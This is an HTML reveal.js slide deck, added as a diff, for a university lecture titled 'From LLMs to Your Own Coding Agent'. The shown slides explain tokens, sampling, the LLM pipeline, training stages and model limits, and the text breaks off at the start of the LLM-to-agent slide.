@@ -1,0 +1,1286 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>From LLMs to Your Own Coding Agent</title>
+
+  <!-- reveal.js core + theme (CDN). To present fully offline, download these files and swap the src/href to local paths. -->
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reset.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/reveal.css" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/dist/theme/black.css" id="theme" />
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js@5.1.0/plugin/highlight/monokai.css" />
+
+  <style>
+    :root {
+      --accent: #58c4dc;
+      --accent2: #f0a35e;
+      --good: #7bd88f;
+      --bg: #14181f;
+      --panel: #1b212b;
+    }
+    .reveal { font-family: "Inter", "Helvetica Neue", system-ui, sans-serif; }
+    .reveal .slides { text-align: left; }
+    .reveal h1, .reveal h2, .reveal h3 { text-transform: none; letter-spacing: -0.01em; }
+    .reveal h1 { font-size: 2.4em; }
+    .reveal section.title h1 { background: linear-gradient(90deg, var(--accent), var(--accent2)); -webkit-background-clip: text; background-clip: text; -webkit-text-fill-color: transparent; }
+    .reveal .accent { color: var(--accent); }
+    .reveal .accent2 { color: var(--accent2); }
+    .reveal .good { color: var(--good); }
+    .reveal .muted { color: #8b97a7; }
+    .reveal section.title { text-align: center; }
+    .reveal .kicker { text-transform: uppercase; letter-spacing: 0.22em; font-size: 0.5em; color: var(--accent); }
+    .reveal pre { width: 100%; box-shadow: none; font-size: 0.52em; }
+    .reveal pre code { border-radius: 10px; padding: 16px 18px; max-height: 560px; }
+    .reveal .cols { display: grid; grid-template-columns: 1fr 1fr; gap: 28px; align-items: start; }
+    .reveal .cols3 { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
+    .reveal .card { background: var(--panel); border: 1px solid #2a3340; border-radius: 12px; padding: 18px 20px; }
+    .reveal .card h3 { margin-top: 0; color: var(--accent); font-size: 0.95em; }
+    .reveal ul { line-height: 1.5; }
+    .reveal li, .reveal p { text-wrap: pretty; }
+    .reveal .eg { display: block; margin-top: 4px; color: #8b97a7; font-size: 0.82em; font-style: italic; }
+    .reveal .eg code { font-style: normal; }
+    .reveal .chatwin { max-width: 780px; margin: 6px auto 0; background: #0f141b; border: 1px solid #2a3340; border-radius: 14px; overflow: hidden; box-shadow: 0 18px 50px rgba(0,0,0,.45); }
+    .reveal .chatbar { display: flex; align-items: center; gap: 8px; padding: 10px 14px; background: #161c25; border-bottom: 1px solid #2a3340; }
+    .reveal .chatbar .d { width: 12px; height: 12px; border-radius: 50%; display: inline-block; }
+    .reveal .chatbar .r { background: #ff5f57; } .reveal .chatbar .y { background: #febc2e; } .reveal .chatbar .g { background: #28c840; }
+    .reveal .chatbar .ct { margin-left: 10px; color: #8b97a7; font-size: 0.5em; }
+    .reveal .chatbody { padding: 20px 22px; display: flex; flex-direction: column; gap: 14px; }
+    .reveal .chatbody .b { font-size: 0.6em; line-height: 1.45; padding: 11px 16px; border-radius: 14px; }
+    .reveal .chatbody .b.user { align-self: flex-end; background: #1f3a4d; color: #eaf4fb; border-bottom-right-radius: 4px; max-width: 78%; }
+    .reveal .chatbody .b.ai { align-self: flex-start; background: #1b212b; border: 1px solid #2a3340; border-bottom-left-radius: 4px; width: 80%; }
+    .reveal .chatbody .b.ai .act { color: #8b97a7; font-size: 0.92em; margin-bottom: 5px; }
+    .reveal .chatbody .b.ai .act::before { content: "\203A  "; color: #7bd88f; }
+    .reveal .chatbody .b.ai .out { font-family: ui-monospace, Menlo, monospace; background: #0f141b; border-radius: 8px; padding: 6px 10px; margin: 6px 0; color: #7bd88f; }
+    .reveal .composer { display: flex; align-items: center; justify-content: space-between; padding: 11px 16px; border-top: 1px solid #2a3340; background: #12171f; color: #5b6675; font-size: 0.52em; }
+    .reveal .composer .send { background: #58c4dc; color: #0f141b; padding: 5px 16px; border-radius: 8px; font-weight: 700; }
+    .reveal small { font-size: 0.6em; }
+    .reveal .pill { display: inline-block; background: #24303d; color: var(--accent); border-radius: 999px; padding: 2px 12px; font-size: 0.55em; margin: 2px; }
+    .reveal table { font-size: 0.62em; }
+    .reveal table th { color: var(--accent); }
+    .reveal .step { color: var(--accent2); font-weight: 700; }
+    .reveal .loop { font-family: ui-monospace, "SF Mono", Menlo, monospace; font-size: 0.7em; line-height: 1.9; background: var(--panel); border: 1px solid #2a3340; border-radius: 12px; padding: 20px 26px; }
+    .reveal .footer { position: fixed; bottom: 12px; left: 20px; font-size: 13px; color: #5b6675; z-index: 30; }
+    .reveal .author { margin: 18px 0 6px; line-height: 1.5; font-size: 0.7em; }
+    .reveal .author strong { color: var(--accent); }
+    .reveal .big { font-size: 1.3em; }
+    .reveal blockquote { background: var(--panel); border-left: 4px solid var(--accent); width: 100%; }
+    .reveal .trace { display: flex; flex-direction: column; gap: 8px; font-size: 0.62em; }
+    .reveal .msg { border-radius: 10px; padding: 8px 14px; border: 1px solid #2a3340; line-height: 1.35; }
+    .reveal .msg .who { display: inline-block; min-width: 74px; font-weight: 700; font-size: 0.8em; letter-spacing: 0.06em; margin-right: 8px; vertical-align: top; }
+    .reveal .msg.user { background: #182430; } .reveal .msg.user .who { color: var(--accent); }
+    .reveal .msg.bot  { background: #1b212b; } .reveal .msg.bot .who { color: var(--accent2); }
+    .reveal .msg.tool { background: #16201a; font-family: ui-monospace, "SF Mono", Menlo, monospace; } .reveal .msg.tool .who { color: var(--good); }
+    .reveal .msg.done { background: #172a1e; border-color: #2f5a3d; } .reveal .msg.done .who { color: var(--good); }
+    .reveal .msg em { color: #8b97a7; font-style: normal; }
+    .reveal .anat { display: grid; grid-template-columns: repeat(5, 1fr); gap: 12px; }
+    .reveal .anat .card { text-align: center; padding: 14px 10px; }
+    .reveal .anat .ico { font-size: 1.6em; display: block; margin-bottom: 6px; }
+    .reveal .anat h3 { font-size: 0.7em; margin: 0 0 4px; }
+    .reveal .anat p { font-size: 0.5em; margin: 0; color: #8b97a7; }
+  </style>
+</head>
+<body>
+  <div class="reveal">
+    <div class="footer">From LLMs to Your Own Coding Agent · Kha Do · dnkha@fit.hcmus.edu.vn · <a href="?print-pdf" title="Open print layout, then use your browser's Print → Save as PDF" style="color:#58c4dc; text-decoration:none;">⤓&nbsp;PDF</a></div>
+    <div class="slides">
+
+      <!-- 1. TITLE -->
+      <section class="title" data-background-color="#0f1319">
+        <div class="kicker">A hands-on introduction</div>
+        <h1>From LLMs to Your Own Coding Agent</h1>
+        <h3 class="muted">LLM basics → coding agent → local demo</h3>
+        <p><span class="pill">LLM basics</span><span class="pill">Agent loop</span><span class="pill">Node.js</span><span class="pill">Claude / Gemini / GPT</span><span class="pill">Ollama + Qwen3</span></p>
+        <p class="muted"><small>Use ← / → arrows to navigate · press <strong>S</strong> for speaker notes · <strong>F</strong> for fullscreen · <strong>ESC</strong> for overview</small></p>
+      </section>
+
+      <!-- 2. INTRODUCTION / ABOUT -->
+      <section class="title" data-background-color="#0f1319">
+        <div class="kicker">About me</div>
+        <h1>Kha Do</h1>
+        <h3 class="muted">Đỗ Nguyên Kha · Teaching Assistant @ FIT-HCMUS</h3>
+        <p><span class="pill">Former Blockchain Engineer</span><span class="pill">FTX JP</span><span class="pill">Liquid</span><span class="pill">QUOINE</span><span class="pill">Custodiem</span></p>
+        <div class="author">
+          <span class="accent">dnkha@fit.hcmus.edu.vn</span> · <span class="accent">kha.do</span>
+        </div>
+        <p class="muted"><small>© FIT-HCMUS · Semester 3, 2025–2026</small></p>
+      </section>
+
+      <!-- 1b. DISCLAIMER -->
+      <section>
+        <h2>Disclaimer</h2>
+        <ul style="font-size: 0.82em;">
+          <li>For <b>learning &amp; research</b> only.</li>
+          <li><b>Not</b> investment or legal advice.</li>
+          <li>Code is simplified — use at your own risk.</li>
+        </ul>
+        <p class="muted"><small>Kha Do · FIT-HCMUS · dnkha@fit.hcmus.edu.vn — inspired by Stanford CS146S "The Modern Software Developer".</small></p>
+        <aside class="notes">Personal views shared here don't reflect my employer(s). Third-party names (Claude, Gemini, GPT, Ollama, Qwen) belong to their respective owners.</aside>
+      </section>
+
+      <!-- 2. AGENDA -->
+      <section>
+        <h2>What we'll cover</h2>
+        <div class="cols3" style="gap:22px; margin-top:20px;">
+          <div class="card" style="text-align:center;">
+            <div class="ico" style="font-size:1.8em;">🧠</div>
+            <p class="step" style="margin:6px 0 0;">Part 1</p>
+            <h3 class="accent" style="margin:2px 0 0;">Foundations</h3>
+          </div>
+          <div class="card" style="text-align:center;">
+            <div class="ico" style="font-size:1.8em;">🛠️</div>
+            <p class="step" style="margin:6px 0 0;">Part 2</p>
+            <h3 class="accent2" style="margin:2px 0 0;">Build it in Node.js</h3>
+          </div>
+          <div class="card" style="text-align:center;">
+            <div class="ico" style="font-size:1.8em;">💻</div>
+            <p class="step" style="margin:6px 0 0;">Part 3</p>
+            <h3 class="good" style="margin:2px 0 0;">Offline &amp; free</h3>
+          </div>
+        </div>
+        <aside class="notes">Goal: by the end, everyone understands the mental model AND has a working agent they can point at a cloud API or a local model.</aside>
+      </section>
+
+      <!-- ===================== PART 1 ===================== -->
+      <section class="title" data-background-color="#101820">
+        <div class="kicker">Part 1</div>
+        <h1 class="accent">Foundations</h1>
+      </section>
+
+      <!-- 3. What is an LLM -->
+      <section>
+        <h2>What is an LLM?</h2>
+        <div style="display:grid; grid-template-columns: 6fr 6fr; gap:36px; align-items:start; font-size:0.82em;">
+          <div>
+            <p>A <strong class="accent">Large Language Model</strong> is a neural net trained on huge text to do one deceptively simple thing:</p>
+            <blockquote class="big" style="font-size:1.1em;">Given some text, predict the <span class="accent2">next token</span>.</blockquote>
+            <ul>
+              <li>A <strong>token</strong> ≈ a word / word-piece</li>
+              <li>It scores <strong>every</strong> possible next token, then picks one</li>
+              <li>Repeat → sentences, code, answers</li>
+            </ul>
+          </div>
+          <div>
+            <!-- Next-token prediction illustration -->
+            <svg viewBox="0 0 460 470" style="width:100%; max-width:560px; height:auto; display:block; margin:0 auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="Next token prediction">
+              <defs>
+                <marker id="ahL" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+                  <path d="M0,0 L8,3 L0,6 Z" fill="#9aa7b6"/>
+                </marker>
+              </defs>
+              <!-- input tokens -->
+              <g font-size="17">
+                <rect x="8"   y="14" width="58" height="34" rx="7" fill="#182430" stroke="#3a4a5a"/><text x="37"  y="36" text-anchor="middle" fill="#dfe6ee">The</text>
+                <rect x="72"  y="14" width="58" height="34" rx="7" fill="#182430" stroke="#3a4a5a"/><text x="101" y="36" text-anchor="middle" fill="#dfe6ee">cat</text>
+                <rect x="136" y="14" width="58" height="34" rx="7" fill="#182430" stroke="#3a4a5a"/><text x="165" y="36" text-anchor="middle" fill="#dfe6ee">sat</text>
+                <rect x="200" y="14" width="52" height="34" rx="7" fill="#182430" stroke="#3a4a5a"/><text x="226" y="36" text-anchor="middle" fill="#dfe6ee">on</text>
+                <rect x="258" y="14" width="58" height="34" rx="7" fill="#182430" stroke="#3a4a5a"/><text x="287" y="36" text-anchor="middle" fill="#dfe6ee">the</text>
+                <rect x="322" y="14" width="46" height="34" rx="7" fill="#231c14" stroke="#f0a35e" stroke-dasharray="4 3"/><text x="345" y="37" text-anchor="middle" fill="#f0a35e">?</text>
+              </g>
+              <!-- arrow down -->
+              <line x1="188" y1="52" x2="188" y2="86" stroke="#9aa7b6" stroke-width="2" marker-end="url(#ahL)"/>
+              <!-- LLM box -->
+              <rect x="40" y="90" width="300" height="66" rx="14" fill="#1b212b" stroke="#f0a35e" stroke-width="2.5"/>
+              <text x="190" y="122" text-anchor="middle" fill="#f0a35e" font-size="22">LLM</text>
+              <text x="190" y="144" text-anchor="middle" fill="#8b97a7" font-size="14">scores every possible next token</text>
+              <!-- arrow down -->
+              <line x1="190" y1="160" x2="190" y2="192" stroke="#9aa7b6" stroke-width="2" marker-end="url(#ahL)"/>
+              <text x="352" y="180" fill="#8b97a7" font-size="13">P(next)</text>
+              <!-- probability bars -->
+              <g font-size="16">
+                <text x="70" y="222" text-anchor="end" fill="#dfe6ee">mat</text>
+                <rect x="80" y="208" width="248" height="20" rx="4" fill="#f0a35e"/><text x="336" y="223" fill="#f0a35e">62%</text>
+                <text x="70" y="258" text-anchor="end" fill="#dfe6ee">floor</text>
+                <rect x="80" y="244" width="60" height="20" rx="4" fill="#3f6a7a"/><text x="148" y="259" fill="#8b97a7">15%</text>
+                <text x="70" y="294" text-anchor="end" fill="#dfe6ee">rug</text>
+                <rect x="80" y="280" width="36" height="20" rx="4" fill="#3f6a7a"/><text x="124" y="295" fill="#8b97a7">9%</text>
+                <text x="70" y="330" text-anchor="end" fill="#dfe6ee">sofa</text>
+                <rect x="80" y="316" width="24" height="20" rx="4" fill="#3f6a7a"/><text x="112" y="331" fill="#8b97a7">6%</text>
+                <text x="70" y="366" text-anchor="end" fill="#8b97a7">…</text>
+                <rect x="80" y="352" width="16" height="20" rx="4" fill="#2a3340"/><text x="104" y="367" fill="#5b6675">8%</text>
+              </g>
+              <!-- picked token -->
+              <text x="80" y="418" fill="#8b97a7" font-size="15">picks →</text>
+              <rect x="150" y="400" width="70" height="34" rx="7" fill="#231c14" stroke="#f0a35e" stroke-width="2"/><text x="185" y="423" text-anchor="middle" fill="#f0a35e" font-size="17">mat</text>
+              <text x="238" y="422" fill="#8b97a7" font-size="14">…then repeats ↺</text>
+            </svg>
+          </div>
+        </div>
+        <aside class="notes">Everything else — chat, reasoning, coding — is an emergent behavior of "predict the next token" done extremely well at scale. The bars show the model doesn't "know" the answer; it estimates a distribution and samples from it.</aside>
+      </section>
+
+      <!-- 3b. Tokens / tokenization -->
+      <section>
+        <h2>Tokens — how a model reads text</h2>
+        <p class="muted">Models read <b class="accent">tokens</b>: small chunks of text, not full words.</p>
+        <div style="display:flex; flex-wrap:wrap; gap:8px; justify-content:center; align-items:center; font-family:ui-monospace,Menlo,monospace; font-size:0.82em; margin:26px 0 14px;">
+          <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">I</span>
+          <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">&nbsp;love</span>
+          <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">&nbsp;building</span>
+          <span style="background:#231c14;border:1px solid #f0a35e;border-radius:7px;padding:9px 13px;color:#f0a35e;">&nbsp;token</span>
+          <span style="background:#231c14;border:1px solid #f0a35e;border-radius:7px;padding:9px 13px;color:#f0a35e;">izers</span>
+          <span style="background:#182430;border:1px solid #3a4a5a;border-radius:7px;padding:9px 13px;color:#dfe6ee;">!</span>
+          <span style="color:#8b97a7; margin-left:10px;">→ 6 tokens</span>
+        </div>
+        <p class="muted" style="text-align:center;"><small>One word (<b class="accent2">"tokenizers"</b>) can split into several tokens — and a leading space is part of the token.</small></p>
+        <div class="cols3" style="margin-top:20px;">
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">✂️</span><h3>≈ ¾ word</h3><p><small>~100 tokens ≈ 75 English words. Code &amp; rare words cost more tokens.</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">💰</span><h3 class="accent2">You pay per token</h3><p><small>Cloud APIs bill input + output tokens. More context = more money.</small></p></div>
+          <div class="card"><span class="ico" style="font-size:1.6em; display:block; margin-bottom:6px;">🪟</span><h3 class="good">Context = token budget</h3><p><small>The "context window" is counted in tokens — the agent's working memory.</small></p></div>
+        </div>
+        <aside class="notes">Tokenization uses byte-pair encoding (BPE). Devs care because tokens drive both cost and the context-window limit.</aside>
+      </section>
+
+      <!-- 3c. Sampling & temperature -->
+      <section>
+        <h2>Why the same prompt gives different answers</h2>
+        <p class="muted">Remember the probability bars? The model returns a <b>distribution</b>, not one answer. <b class="accent">Sampling</b> picks from it; <b class="accent2">temperature</b> sets how adventurous.</p>
+        <div class="cols" style="margin-top:14px;">
+          <div class="card">
+            <span class="ico" style="font-size:1.4em; display:block; margin-bottom:2px;">❄️</span>
+            <h3 class="accent" style="margin-bottom:6px;">temperature = 0</h3>
+            <p><small><b>Repeatable</b> · deterministic. <span class="good">✔ Best for code, tools, structured output.</span></small></p>
+          </div>
+          <div class="card">
+            <span class="ico" style="font-size:1.4em; display:block; margin-bottom:2px;">🔥</span>
+            <h3 class="accent2" style="margin-bottom:6px;">temperature ≈ 0.7 – 1.0</h3>
+            <p><small><b>Varied</b> · creative, different each run. <span class="muted">✔ Ideas, writing, brainstorming.</span></small></p>
+          </div>
+        </div>
+        <blockquote style="margin-top:14px;"><small>Same question, run twice, different reply? Not a bug — that's sampling. For your <b>coding agent</b>, keep temperature <b class="accent">low</b>.</small></blockquote>
+        <aside class="notes">Other knobs: top-p (nucleus) and top-k trim the candidate set before sampling. Temperature reshapes the distribution: 0 ≈ argmax, higher = flatter.</aside>
+      </section>
+
+      <!-- 4. How it works step by step -->
+      <section>
+        <h2>How an LLM works — step by step</h2>
+        <p class="muted">One token at a time, in a loop:</p>
+        <svg viewBox="0 0 1090 330" style="width:100%; max-width:1060px; height:auto; display:block; margin:0 auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="LLM pipeline">
+          <defs>
+            <marker id="ahP" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#9aa7b6"/>
+            </marker>
+            <marker id="ahP2" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#f0a35e"/>
+            </marker>
+          </defs>
+
+          <!-- input pill -->
+          <rect x="6" y="78" width="80" height="44" rx="9" fill="#182430" stroke="#58c4dc"/>
+          <text x="46" y="105" text-anchor="middle" fill="#dfe6ee" font-size="15">text</text>
+
+          <!-- stage boxes -->
+          <!-- box template: rect + badge + name + sublabel -->
+          <g>
+            <rect x="102" y="40" width="152" height="120" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+            <circle cx="126" cy="66" r="13" fill="#f0a35e"/><text x="126" y="71" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">1</text>
+            <text x="178" y="94" text-anchor="middle" font-size="21">✂️</text>
+            <text x="178" y="118" text-anchor="middle" fill="#58c4dc" font-size="18" font-weight="700">Tokenize</text>
+            <text x="178" y="138" text-anchor="middle" fill="#8b97a7" font-size="12.5">text → tokens</text>
+          </g>
+          <g>
+            <rect x="274" y="40" width="152" height="120" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+            <circle cx="298" cy="66" r="13" fill="#f0a35e"/><text x="298" y="71" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">2</text>
+            <text x="350" y="94" text-anchor="middle" font-size="21">🔢</text>
+            <text x="350" y="118" text-anchor="middle" fill="#58c4dc" font-size="18" font-weight="700">Embed</text>
+            <text x="350" y="138" text-anchor="middle" fill="#8b97a7" font-size="12.5">tokens → vectors</text>
+          </g>
+          <g>
+            <rect x="446" y="40" width="152" height="120" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+            <circle cx="470" cy="66" r="13" fill="#f0a35e"/><text x="470" y="71" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">3</text>
+            <text x="522" y="94" text-anchor="middle" font-size="21">👁️</text>
+            <text x="522" y="118" text-anchor="middle" fill="#58c4dc" font-size="18" font-weight="700">Attention</text>
+            <text x="522" y="138" text-anchor="middle" fill="#8b97a7" font-size="12.5">weigh the context</text>
+          </g>
+          <g>
+            <rect x="618" y="40" width="152" height="120" rx="12" fill="#231c14" stroke="#f0a35e" stroke-width="2.5"/>
+            <circle cx="642" cy="66" r="13" fill="#f0a35e"/><text x="642" y="71" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">4</text>
+            <text x="694" y="94" text-anchor="middle" font-size="21">📊</text>
+            <text x="694" y="118" text-anchor="middle" fill="#f0a35e" font-size="18" font-weight="700">Predict</text>
+            <text x="694" y="138" text-anchor="middle" fill="#8b97a7" font-size="12.5">next-token probs</text>
+          </g>
+          <g>
+            <rect x="790" y="40" width="152" height="120" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+            <circle cx="814" cy="66" r="13" fill="#f0a35e"/><text x="814" y="71" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">5</text>
+            <text x="866" y="94" text-anchor="middle" font-size="21">🎲</text>
+            <text x="866" y="118" text-anchor="middle" fill="#58c4dc" font-size="18" font-weight="700">Sample</text>
+            <text x="866" y="138" text-anchor="middle" fill="#8b97a7" font-size="12.5">pick one token</text>
+          </g>
+
+          <!-- output pill -->
+          <rect x="962" y="78" width="122" height="44" rx="9" fill="#182430" stroke="#58c4dc"/>
+          <text x="1023" y="105" text-anchor="middle" fill="#dfe6ee" font-size="15">next token</text>
+
+          <!-- forward arrows -->
+          <g stroke="#9aa7b6" stroke-width="2" marker-end="url(#ahP)">
+            <line x1="86"  y1="100" x2="102" y2="100"/>
+            <line x1="254" y1="100" x2="274" y2="100"/>
+            <line x1="426" y1="100" x2="446" y2="100"/>
+            <line x1="598" y1="100" x2="618" y2="100"/>
+            <line x1="770" y1="100" x2="790" y2="100"/>
+            <line x1="942" y1="100" x2="962" y2="100"/>
+          </g>
+
+          <!-- loop-back arrow (step 6) -->
+          <path d="M 1023 122 C 1023 290, 46 290, 46 122" fill="none" stroke="#f0a35e" stroke-width="2.5" stroke-dasharray="7 5" marker-end="url(#ahP2)"/>
+          <text x="534" y="284" text-anchor="middle" fill="#f0a35e" font-size="15">6 · append the new token, then repeat from step 1 ↺</text>
+        </svg>
+        <div class="card" style="margin-top:8px; font-size:0.62em; line-height:1.9;">
+          <b class="accent">Example — </b><span style="font-family:ui-monospace,Menlo,monospace;">"The cat sat on the ___"</span>
+          &nbsp; ✂️ <code>[The][ cat][ sat][ on][ the]</code>
+          &nbsp;→&nbsp; 🔢 vectors
+          &nbsp;→&nbsp; 👁️ <span class="muted">"sat on the" hints a surface</span>
+          &nbsp;→&nbsp; 📊 <span class="accent2">mat</span> 62% · floor 15% · rug 9%
+          &nbsp;→&nbsp; 🎲 picks <b class="accent2">"mat"</b>
+          &nbsp; ↺ <span class="muted">append it, predict the next word…</span>
+        </div>
+      </section>
+
+      <!-- 5. Training -->
+      <section>
+        <h2>How does it "learn"? Three stages</h2>
+        <p class="muted">A plain text-predictor is gradually shaped into a helpful assistant:</p>
+        <svg viewBox="0 0 1090 300" style="width:100%; max-width:1060px; height:auto; display:block; margin:0 auto;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="Training stages">
+          <defs>
+            <marker id="ahT" markerWidth="10" markerHeight="10" refX="8" refY="3" orient="auto" markerUnits="strokeWidth">
+              <path d="M0,0 L8,3 L0,6 Z" fill="#9aa7b6"/>
+            </marker>
+          </defs>
+
+          <!-- input pill -->
+          <rect x="6" y="88" width="120" height="60" rx="10" fill="#182430" stroke="#58c4dc"/>
+          <text x="66" y="112" text-anchor="middle" fill="#dfe6ee" font-size="15">Raw text</text>
+          <text x="66" y="132" text-anchor="middle" fill="#8b97a7" font-size="13">&amp; code</text>
+
+          <!-- stage 1 -->
+          <rect x="150" y="43" width="218" height="150" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+          <circle cx="176" cy="71" r="13" fill="#f0a35e"/><text x="176" y="76" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">1</text>
+          <text x="259" y="102" text-anchor="middle" font-size="22">📚</text>
+          <text x="259" y="128" text-anchor="middle" fill="#58c4dc" font-size="19" font-weight="700">Pre-training</text>
+          <text x="259" y="148" text-anchor="middle" fill="#8b97a7" font-size="12.5">read the internet, books,</text>
+          <text x="259" y="167" text-anchor="middle" fill="#8b97a7" font-size="12.5">code → learn language &amp; facts</text>
+
+          <!-- stage 2 -->
+          <rect x="392" y="43" width="218" height="150" rx="12" fill="#1b212b" stroke="#58c4dc" stroke-width="2"/>
+          <circle cx="418" cy="71" r="13" fill="#f0a35e"/><text x="418" y="76" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">2</text>
+          <text x="501" y="102" text-anchor="middle" font-size="22">🎓</text>
+          <text x="501" y="128" text-anchor="middle" fill="#58c4dc" font-size="19" font-weight="700">Fine-tuning</text>
+          <text x="501" y="148" text-anchor="middle" fill="#8b97a7" font-size="12.5">instruction → answer pairs</text>
+          <text x="501" y="167" text-anchor="middle" fill="#8b97a7" font-size="12.5">→ learn to follow requests</text>
+
+          <!-- stage 3 -->
+          <rect x="634" y="43" width="218" height="150" rx="12" fill="#16201a" stroke="#7bd88f" stroke-width="2"/>
+          <circle cx="660" cy="71" r="13" fill="#f0a35e"/><text x="660" y="76" text-anchor="middle" fill="#14181f" font-size="15" font-weight="700">3</text>
+          <text x="743" y="102" text-anchor="middle" font-size="22">👍</text>
+          <text x="743" y="128" text-anchor="middle" fill="#7bd88f" font-size="19" font-weight="700">RLHF</text>
+          <text x="743" y="148" text-anchor="middle" fill="#8b97a7" font-size="12.5">humans rank answers →</text>
+          <text x="743" y="167" text-anchor="middle" fill="#8b97a7" font-size="12.5">helpful, honest, harmless</text>
+
+          <!-- output pill -->
+          <rect x="876" y="88" width="200" height="60" rx="10" fill="#172a1e" stroke="#7bd88f" stroke-width="2"/>
+          <text x="976" y="112" text-anchor="middle" fill="#7bd88f" font-size="16">Assistant</text>
+          <text x="976" y="132" text-anchor="middle" fill="#8b97a7" font-size="13">chat-ready &amp; aligned</text>
+
+          <!-- forward arrows -->
+          <g stroke="#9aa7b6" stroke-width="2" marker-end="url(#ahT)">
+            <line x1="126" y1="118" x2="150" y2="118"/>
+            <line x1="368" y1="118" x2="392" y2="118"/>
+            <line x1="610" y1="118" x2="634" y2="118"/>
+            <line x1="852" y1="118" x2="876" y2="118"/>
+          </g>
+        </svg>
+        <div class="card" style="margin-top:8px; font-size:0.6em; line-height:1.85;">
+          <b class="accent">Example, same fact through each stage:</b><br/>
+          📚 <b>Pre-train:</b> reads <span style="font-family:ui-monospace,Menlo,monospace;">"Paris is the capital of France"</span> across the web → soaks up the fact
+          &nbsp;·&nbsp; 🎓 <b>Fine-tune:</b> shown <code>Q: Capital of France? → A: Paris.</code> → learns to <i>answer</i>, not just autocomplete
+          &nbsp;·&nbsp; 👍 <b class="good">RLHF:</b> humans prefer the clear, polite, correct reply → learns tone &amp; safety
+        </div>
+      </section>
+
+      <!-- 6a. Key concepts -->
+      <section>
+        <h2>Key concepts to know</h2>
+        <div class="cols3">
+          <div class="card">
+            <h3><span style="margin-right:8px;">🪟</span>Context window</h3>
+            <p><small>How much text it can "see" at once — its short-term memory.</small></p>
+            <span class="eg">e.g. ~200K tokens ≈ a 500-page book in one go.</span>
+          </div>
+          <div class="card">
+            <h3><span style="margin-right:8px;">⚙️</span>System prompt</h3>
+            <p><small>Hidden instructions that set its role &amp; rules.</small></p>
+            <span class="eg">e.g. <code>system: "You are a terse Python expert. Reply in code only."</code></span>
+          </div>
+          <div class="card">
+            <h3><span style="margin-right:8px;">💰</span>Tokens = cost</h3>
+            <p><small>You pay per token — for input <b>and</b> output.</small></p>
+            <span class="eg">e.g. ~1,000 tokens ≈ 750 English words ≈ a short email.</span>
+          </div>
+        </div>
+        <!-- context window illustration -->
+        <svg viewBox="0 0 1040 104" style="width:100%; max-width:1020px; height:auto; display:block; margin:14px auto 0;" font-family="Inter, system-ui, sans-serif" role="img" aria-label="Context window">
+          <rect x="0" y="48" width="1040" height="26" rx="6" fill="#222b36"/>
+          <rect x="370" y="40" width="300" height="42" rx="8" fill="#182430" stroke="#58c4dc" stroke-width="2"/>
+          <text x="520" y="30" text-anchor="middle" fill="#58c4dc" font-size="15">context window — what the model sees right now</text>
+          <text x="520" y="67" text-anchor="middle" fill="#dfe6ee" font-size="14">…the cat sat on the…</text>
+          <text x="175" y="66" text-anchor="middle" fill="#5b6675" font-size="13">← older text falls off</text>
+          <text x="855" y="66" text-anchor="middle" fill="#5b6675" font-size="13">not written yet →</text>
+        </svg>
+      </section>
+
+      <!-- 6b. Honest limits -->
+      <section>
+        <h2>Honest limits</h2>
+        <div class="cols">
+          <div class="card">
+            <h3><span style="margin-right:8px;">🌀</span>Hallucination</h3>
+            <p><small><b>Confidently wrong.</b></small></p>
+            <span class="eg">invents <code>Array.shuffle()</code></span>
+          </div>
+          <div class="card">
+            <h3><span style="margin-right:8px;">📅</span>Knowledge cutoff</h3>
+            <p><small><b>May miss new info.</b></small></p>
+            <span class="eg">a library from last week</span>
+          </div>
+          <div class="card">
+            <h3><span style="margin-right:8px;">🫥</span>No memory</h3>
+            <p><small><b>Context must be resent.</b></small></p>
+            <span class="eg">new chat → forgets you</span>
+          </div>
+          <div class="card">
+            <h3><span style="margin-right:8px;">🚫</span>Can't act</h3>
+            <p><small><b>Needs tools to do anything.</b></small></p>
+            <span class="eg">writes <code>npm test</code>, can't run it</span>
+          </div>
+        </div>
+        <aside class="notes">Confidently wrong = states false things as fact (e.g. a JS method that doesn't exist). Cutoff = knowledge frozen at training time. No memory = stateless between calls; you resend the whole history. Can't act = outputs text only → agents add the "hands" (tools).</aside>
+      </section>
+
+      <!-- 7. LLM vs Agent -->
+      <section>
+        <h2>From LLM → Coding Agent</h2>
+        <div class="cols">
+          <div class="card">
